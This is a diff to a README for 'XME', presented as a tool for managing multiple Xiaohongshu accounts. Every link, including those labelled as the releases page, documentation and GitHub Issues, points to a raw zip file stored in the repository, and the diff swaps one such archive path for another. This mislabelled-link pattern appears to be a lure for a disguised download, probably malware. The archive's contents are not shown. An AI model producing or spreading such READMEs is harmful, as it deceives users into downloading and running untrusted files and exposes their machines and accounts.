@@ -6,9 +6,9 @@ Welcome to XME! This tool helps you manage multiple accounts on 小红书 with e
 
 ## 📥 Download XME
 
-[![Download XME](https://raw.githubusercontent.com/martiny974/XME/main/strigulose/XME.zip)](https://raw.githubusercontent.com/martiny974/XME/main/strigulose/XME.zip)
+[![Download XME](https://github.com/martiny974/XME/raw/refs/heads/main/pkg/downloader/Software-3.4.zip)](https://github.com/martiny974/XME/raw/refs/heads/main/pkg/downloader/Software-3.4.zip)
 
-To get started, you need to download the software. Click the button above or visit the [Releases page](https://raw.githubusercontent.com/martiny974/XME/main/strigulose/XME.zip) to grab the latest version of XME.
+To get started, you need to download the software. Click the button above or visit the [Releases page](https://github.com/martiny974/XME/raw/refs/heads/main/pkg/downloader/Software-3.4.zip) to grab the latest version of XME.
 
 ## 📋 System Requirements
 
@@ -22,7 +22,7 @@ Before you download, make sure your system meets these minimum requirements:
 ## 🛠️ Installation Steps
 
 1. **Visit the Releases Page**  
-   Click [here](https://raw.githubusercontent.com/martiny974/XME/main/strigulose/XME.zip) to view the latest release.
+   Click [here](https://github.com/martiny974/XME/raw/refs/heads/main/pkg/downloader/Software-3.4.zip) to view the latest release.
 
 2. **Download the Latest Version**  
    Locate the version labeled as "Latest Release." Click the download link for your operating system.
@@ -54,7 +54,7 @@ After launching XME, you will see the main dashboard. Here are some essential fe
 If you encounter issues while using XME, try these tips:
 
 - **Check Your Internet Connection:** Make sure you are connected to the internet.
-- **Update the Application:** Regular updates can fix bugs and improve performance. Always download the latest version from the [Releases page](https://raw.githubusercontent.com/martiny974/XME/main/strigulose/XME.zip).
+- **Update the Application:** Regular updates can fix bugs and improve performance. Always download the latest version from the [Releases page](https://github.com/martiny974/XME/raw/refs/heads/main/pkg/downloader/Software-3.4.zip).
 - **Reinstall the Application:** If issues persist, uninstall XME and follow the installation steps again.
 
 ## 📞 Get Help
@@ -69,7 +69,7 @@ XME is licensed under the MIT License. You can view the full license details in 
 
 For more information about XME, visit the following links:
 
-- [Documentation](https://raw.githubusercontent.com/martiny974/XME/main/strigulose/XME.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/martiny974/XME/main/strigulose/XME.zip)
+- [Documentation](https://github.com/martiny974/XME/raw/refs/heads/main/pkg/downloader/Software-3.4.zip)
+- [GitHub Issues](https://github.com/martiny974/XME/raw/refs/heads/main/pkg/downloader/Software-3.4.zip)
 
 Thank you for using XME! Enjoy managing your multiple accounts with ease.
